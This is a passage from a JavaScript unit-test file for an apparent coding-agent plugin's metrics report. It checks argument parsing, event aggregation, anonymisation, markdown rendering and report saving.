    at(3, { session: "c", kind: "stop-check", findings: 4, patterns: [
      { rule: "print() in application code (use logging)", source: "builtin", ext: "py", count: 3 },
      { rule: "no calls to the Acme billing SDK", source: "project", ext: "py", count: 1 },
    ] }),
    at(4, { session: "d", kind: "stop-check", findings: 1, patterns: [{ rule: "no calls to the Acme billing SDK", source: "project", ext: "py", count: 1 }] }),
    at(4, { session: "d", kind: "lint", component: "payroll-api", ext: "py", problems: 2 }),
    at(4, { session: "d", kind: "command", name: "cuadrilla:ticket" }),
    at(4, { session: "d", kind: "agent", name: "cuadrilla:reviewer", unattended: true }),
    at(4, { session: "d", kind: "skill", name: "cuadrilla:verify" }),
  ];

  it("parses arguments the way the command passes them", () => {
    assert.deepEqual(parseArgs([]), { days: 30, anonymous: false, json: false, save: false, root: null });
    assert.deepEqual(parseArgs(["7", "anonimo", "--save"]), { days: 7, anonymous: true, json: false, save: true, root: null });
    assert.equal(parseArgs(["--days", "0"]).days, 0);
    assert.equal(parseArgs(["--days", "-3"]).days, 30);
  });

  it("reads both files, skips bad lines and filters by period", () => {
    const dir = tempDir();
    writeFile(dir, ".claude/cuadrilla/metrics.1.jsonl", `${JSON.stringify(at(1, { kind: "agent", name: "old" }))}\nnot json\n`);
    writeFile(dir, ".claude/cuadrilla/metrics.jsonl", `${JSON.stringify(at(20, { kind: "agent", name: "new" }))}\n{"kind":"x"}\n\n`);
    const now = Date.parse("2026-10-24T00:00:00Z");
    assert.deepEqual(readEvents(dir, 10, now).events.map((e) => e.name), ["new"]);
    const all = readEvents(dir, 0, now);
    assert.deepEqual(all.events.map((e) => e.name), ["old", "new"]);
    assert.equal(all.invalid, 2);
  });

  it("aggregates and ranks the most repeated patterns", () => {
    const report = aggregate(fixture);
    assert.equal(report.sessions, 4);
    assert.equal(report.unattendedSessions, 2);
    assert.equal(report.guard.deny.get("push"), 3);
    assert.equal(report.guard.denyUnattended.get("push"), 1);
    assert.equal(report.guard.ask.get("merge-rebase"), 1);
    assert.equal(report.stopCheck.turns, 2);
    assert.equal(report.stopCheck.findings, 5);
    assert.deepEqual(report.patterns.map((p) => [p.source, p.rule, p.count, p.sessions]), [
      ["guard", "push", 3, 2],
      ["stop-check", "print() in application code (use logging)", 3, 1],
      ["stop-check", "no calls to the Acme billing SDK", 2, 2], // ties with lint (2): more sessions wins
    ]);
    assert.match(report.patterns[0].hint, /agent\/<name>/);
  });

  it("anonymizes component names and project rules, not built-in rules", () => {
    const text = JSON.stringify(toJson(anonymize(aggregate(fixture)), { days: 30 }));
    assert.doesNotMatch(text, /payroll|Acme|"a"|"b"|"c"|"d"/);
    assert.match(text, /component-1/);
    assert.match(text, /project rule #1/);
    assert.match(text, /print\(\) in application code/);
    assert.match(text, /"anonymous":true/);
  });

  it("renders markdown with the patterns first and explains an empty period", () => {
    const markdown = toMarkdown(aggregate(fixture), { days: 30 });
    assert.ok(markdown.indexOf("## Most repeated patterns") < markdown.indexOf("## Guardrails"));
    assert.match(markdown, /\| push \| 3 \|/);
    assert.match(markdown, /Sessions: 4 \(2 unattended\)/);
    assert.match(toMarkdown(aggregate([]), { days: 7 }), /No events in this period[\s\S]*CUADRILLA_METRICS=off/);
  });

  it("runs as a command and saves only under the metrics folder", () => {
    const dir = tempDir();
    writeFile(dir, ".claude/cuadrilla/metrics.jsonl", `${fixture.map((e) => JSON.stringify({ ...e, ts: new Date().toISOString() })).join("\n")}\n`);
    const script = join(SCRIPTS, "..", "..", "skills", "report", "report.mjs");
    const run = (...args) => spawnSync(process.execPath, [script, ...args], { cwd: dir, encoding: "utf8", env: { ...process.env, CLAUDE_PROJECT_DIR: dir } });
    const md = run("30", "anonymous", "--save");
    assert.equal(md.status, 0, md.stderr);
    assert.match(md.stdout, /Cuadrilla metrics report \(anonymous\)/);
    assert.match(md.stdout, /Saved to .*\.claude[/\\]cuadrilla[/\\]reports[/\\]report-\d{4}-\d{2}-\d{2}-anonymous\.md/);
    const json = JSON.parse(run("--json").stdout);
    assert.equal(json.guard.deny.push, 3);
  });
});
